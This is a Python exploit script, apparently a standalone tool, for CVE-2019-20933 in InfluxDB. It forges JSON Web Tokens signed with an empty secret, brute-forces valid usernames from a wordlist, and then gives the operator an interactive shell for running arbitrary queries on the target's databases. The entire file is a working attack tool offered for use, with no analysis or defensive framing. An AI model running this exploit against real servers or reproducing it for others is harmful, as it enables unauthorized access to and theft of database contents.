#!/bin/env python

import json
import pathlib
import time
import urllib
import requests as requests
import jwt
from termcolor import colored

def bruteforceUser(filename, host, port):
    print()
    print("Bruteforcing usernames ...")
    with open(filename) as f:
        for line in f:
            line = line.replace("\n", "")
            exp = int(time.time())
            exp = exp + 2.628 * 10 ** 6
            # Generation JWT
            payload = {
                "username": line,
                "exp": exp
            }

            token = jwt.encode(payload, "", algorithm="HS256")
            query = "SHOW DATABASES"
            response = makeQuery(token, 'dummy', host, port, query)
            response = json.loads(response)
            if "error" in response.keys():
                if "signature is invalid" in response['error']:
                    print(colored("ERROR: Host not vulnerable !!!", "red"))
                    print(colored("ERROR: " + response['error'] + "", "red"))
                    exit(1)
                if "user not found" in response['error']:
                    print("[{}] {}".format(colored("x", "red"), line))
            else:
                print("[{}] {}".format(colored("v", "green"), line))
                print()
                username = line
                return username

    print(colored("ERROR: no valid username found !!!", "red"))
    exit(1)

def makeQuery(token, db, host, port, query):
    try:
        headers = {
            'Authorization': 'Bearer ' + token,
        }
    except:
        token = token.decode("utf-8")
        headers = {
            'Authorization': 'Bearer ' + token,
        }

    # Send request
    query = urllib.parse.quote_plus(query)
    response = requests.get('http://' + host + ':' + str(port) + '/query?db=' + db + '&q=' + query, headers=headers)
    return response.text

def exploit():
    # imput data
    print()
    try:
        host = input("Host (default: localhost): ")
    except KeyboardInterrupt:
        return

    if host == "":
        host = "127.0.0.1"

    try:
        port = input("Port (default: 8086): ")
    except KeyboardInterrupt:
        return
    if port == "":
        port = 8086

    try:
        username = input("Username <OR> path to username file (default: users.txt): ")
    except KeyboardInterrupt:
        return

    if username == "":
        username = "users.txt"

    # check if username is a valid file to start bruteforce
    file = pathlib.Path(username)
    if file.exists():
        username = bruteforceUser(username, host, port)

    exp = int(time.time())
    exp = exp + 2.628 * 10 ** 6  # Aggiungo un mese

    # Generation JWT
    payload = {
        "username": username,
        "exp": exp
    }

    token = jwt.encode(payload, "", algorithm="HS256")
    #print("Token: {}".format(token))
    query = "SHOW DATABASES"
    response = makeQuery(token, 'dummy', host, port, query)
    response = json.loads(response)

    if "results" in response.keys():
        print(colored("Host vulnerable !!!", "green"))
    else:
        print(colored("ERROR: Host not vulnerable !!!", "red"))
        print(colored("ERROR: "+response['error']+"", "red"))
        return
    
    # Get databases list
    dblist = [db[0] for db in response['results'][0]['series'][0]['values']]

    while True:
        print()
        print("Databases:")
        print()
        for (i, db) in enumerate(dblist):
            print("{}) {}".format(i + 1, db))

        print()
        print(".quit to exit")


        try:
            db = input("[{}@{}] Database: ".format(colored(username, "red"), colored(host, "yellow")))
        except KeyboardInterrupt:
            print()
            print("~ Bye!")
            break
        
        try:
            db = dblist[int(db) - 1]
        except IndexError as e:
            # Prompt again if database index if not in range
            continue
        except Exception as e:
            # Check if database exists if its a string
            if db.strip() == "":
                continue
            if db not in dblist:
                print(colored("[Error] ", "red") + "No such database: \"" + colored(db, "yellow") + "\"")
                continue
            pass

        if db in ['.exit', '.quit', '.back']:
            return
        if db == "":
            continue
        
        print()
        print("Starting InfluxDB shell - .back to go back")
        while True:
            try:
                query = input("[{}@{}/{}] $ ".format(colored(username, "red"), colored(host, "yellow"), colored(db, "blue")))
            except KeyboardInterrupt:
                break

            if query.strip() == "":
                continue

            if query in ['.exit', '.quit', '.back']:
                break

            response = makeQuery(token, db, host, port, query)
            response = json.loads(response)
            print(json.dumps(response, indent=4, sort_keys=True))


if __name__ == '__main__':
    print(colored("""
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  """, 'green'))
    print(colored(" - using CVE-2019-20933", "yellow"))

    exploit()
